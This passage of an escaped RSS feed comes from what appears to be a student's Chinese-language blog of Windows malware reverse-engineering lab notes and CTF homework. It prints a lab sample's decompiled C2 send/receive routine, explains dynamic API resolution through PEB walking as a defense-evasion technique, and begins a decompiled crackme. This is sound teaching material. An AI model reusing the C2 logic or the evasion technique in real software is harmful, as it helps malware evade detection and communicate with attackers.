&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v7; &lt;span style="color:#75715e">// al
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> j; &lt;span style="color:#75715e">// ecx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v9; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x4Cu&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v5 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( recv(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_key &lt;span style="color:#f92672">=&lt;/span> (v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_data(pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>] &lt;span style="color:#f92672">+=&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy_s(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64, cipher, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_20;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">39&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">43&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">49&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[&lt;span style="color:#ae81ff">67&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v4[&lt;span style="color:#ae81ff">54&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> (v4[&lt;span style="color:#ae81ff">61&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">69&lt;/span>]) &lt;span style="color:#f92672">+&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_20:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>&lt;code>connet_to_c2&lt;/code>
目標是取得c2 server的IP和port number&lt;/p></description></item><item><title>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</guid><description>&lt;h1 id="simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">
 Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)
 &lt;a class="anchor" href="#simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Process Environment Block (PEB)
&lt;ul>
&lt;li>紀錄許多 Process 相關資訊的 OS 資料結構&lt;/li>
&lt;li>存在於 user land&lt;/li>
&lt;li>x86 環境下，可以從 fs:[0x30] 取得&lt;/li>
&lt;li>x64 環境下，可以從 gs:[0x60] 取得&lt;/li>
&lt;li>==0x18: Ldr==
&lt;ul>
&lt;li>指向 _PEB_LDR_DATA 結構&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB">_PEB&lt;/a> (注意 x64 和 x86 結構不同)
&lt;img src="https://hackmd.io/_uploads/HyIcW4CfT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_PEB_LDR_DATA
&lt;ul>
&lt;li>紀錄 Process 中載入模組的相關資訊
&lt;ul>
&lt;li>模組 module：PE 或 DLL&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x10: InLoadOrderModuleList==
&lt;ul>
&lt;li>指向 _LDR_DATA_TABLE_ENTRY&lt;/li>
&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB_LDR_DATA">_PEB_LDR_DATA&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BJFj-NAGp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;ul>
&lt;li>紀錄一個載入模組的相關資訊&lt;/li>
&lt;li>==0x00: InLoadOrderModuleList==
&lt;ul>
&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;li>Flink：指向下一個 entry&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x30: DllBase==
&lt;ul>
&lt;li>此載入模組的 ImageBase&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x58: BaseDllName==
&lt;ul>
&lt;li>此載入模組的檔案名稱&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;img src="https://hackmd.io/_uploads/BJ5JfVAMp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Defense Evasion — Dynamic API Resolution
&lt;ul>
&lt;li>用途:
&lt;blockquote>
&lt;p>駭客常用的手法往往倚賴特定的 API 來達成，例如：&lt;code>Injection&lt;/code> = &lt;code>VirtualAllocEx&lt;/code> + &lt;code>WriteProcessMemory&lt;/code> + &lt;code>CreateRemoteThread&lt;/code>，因此資安產品只要監控這些 API，就很容易偵測到惡意行為
Shellcode 沒有 loader 幫你把 API 連結起來&lt;/p></description></item><item><title>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</guid><description>&lt;h1 id="simple-reverse---0x252023-lab---winmalware---作業">
 Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)
 &lt;a class="anchor" href="#simple-reverse---0x252023-lab---winmalware---%e4%bd%9c%e6%a5%ad">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>在 next stage payload 的 my_start 導出函數中，惡意程式透過 dynamic API resolution 手法取得了一些 APIs。請問其從 user32.dll 取得的 API 的名稱為何？
&lt;a href="https://github.com/Mr-Un1k0d3r/WindowsDllsExport/blob/main/Win11-22000/user32.dll.txt">A list of all exported functions of user32.dll&lt;/a>&lt;/p>
&lt;p>Flag format: FLAG{WindowsAPIname}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/Bkd51XRM6">Dynamic API Resolution Background&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>根據前一個筆記，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道&lt;code>__ROL4__&lt;/code>的意思，根據&lt;a href="https://www.felixcloutier.com/x86/rcl:rcr:rol:ror">x86 and amd64 instruction reference&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.&lt;/p></description></item><item><title>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/</guid><description>&lt;h1 id="simple-reverse---0x262023-hw---banana-donut-verifier">
 Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)
 &lt;a class="anchor" href="#simple-reverse---0x262023-hw---banana-donut-verifier">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>__int64 __fastcall main(int a1, char &lt;span style="color:#f92672">**&lt;/span>a2, char &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">//&lt;/span> [COLLAPSED LOCAL DECLARATIONS&lt;span style="color:#f92672">.&lt;/span> PRESS KEYPAD CTRL&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#e6db74">&amp;#34;+&amp;#34;&lt;/span> TO EXPAND]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v46 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v42 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(user_input, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1024&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Dount Verifier&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Input: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%1023s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, user_input);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x1B&lt;/span>&lt;span style="color:#e6db74">[2J&amp;#34;&lt;/span>); &lt;span style="color:#f92672">//&lt;/span> 這個意思是清除整個頁面
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">499&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(s, &lt;span style="color:#ae81ff">32&lt;/span>, sizeof(s));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(v20, &lt;span style="color:#ae81ff">0&lt;/span>, sizeof(v20));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6.28&lt;/span>; j &lt;span style="color:#f92672">=&lt;/span> v14 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v40 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( k &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>; k &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6.28&lt;/span>; k &lt;span style="color:#f92672">=&lt;/span> v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(k));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v3&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v3&lt;span style="color:#f92672">.&lt;/span>m128i_i64);&lt;span style="color:#f92672">//&lt;/span> 計算浮點數的正弦值&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>參考自https:&lt;span style="color:#f92672">//&lt;/span>learn&lt;span style="color:#f92672">.&lt;/span>microsoft&lt;span style="color:#f92672">.&lt;/span>com&lt;span style="color:#f92672">/&lt;/span>zh&lt;span style="color:#f92672">-&lt;/span>tw&lt;span style="color:#f92672">/&lt;/span>cpp&lt;span style="color:#f92672">/&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>runtime&lt;span style="color:#f92672">-&lt;/span>library&lt;span style="color:#f92672">/&lt;/span>reference&lt;span style="color:#f92672">/&lt;/span>sin&lt;span style="color:#f92672">-&lt;/span>sinf&lt;span style="color:#f92672">-&lt;/span>sinl&lt;span style="color:#960050;background-color:#1e0010">?&lt;/span>view&lt;span style="color:#f92672">=&lt;/span>msvc&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">170&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v3));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(j));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v4&lt;span style="color:#f92672">.&lt;/span>m128i_i64);&lt;span style="color:#f92672">//&lt;/span> 計算餘弦值&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>參考自https:&lt;span style="color:#f92672">//&lt;/span>learn&lt;span style="color:#f92672">.&lt;/span>microsoft&lt;span style="color:#f92672">.&lt;/span>com&lt;span style="color:#f92672">/&lt;/span>zh&lt;span style="color:#f92672">-&lt;/span>tw&lt;span style="color:#f92672">/&lt;/span>cpp&lt;span style="color:#f92672">/&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>runtime&lt;span style="color:#f92672">-&lt;/span>library&lt;span style="color:#f92672">/&lt;/span>reference&lt;span style="color:#f92672">/&lt;/span>cos&lt;span style="color:#f92672">-&lt;/span>cosf&lt;span style="color:#f92672">-&lt;/span>cosl&lt;span style="color:#960050;background-color:#1e0010">?&lt;/span>view&lt;span style="color:#f92672">=&lt;/span>msvc&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">170&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v4));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v47));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v5&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v5&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v5));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(j));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v6&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v6&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v6));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v47));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v7&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v7&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v7));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> v36 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.0&lt;/span> &lt;span style="color:#f92672">/&lt;/span> ((((v37 &lt;span style="color:#f92672">*&lt;/span> (v36 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2.0&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> v35) &lt;span style="color:#f92672">+&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">5.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(k));
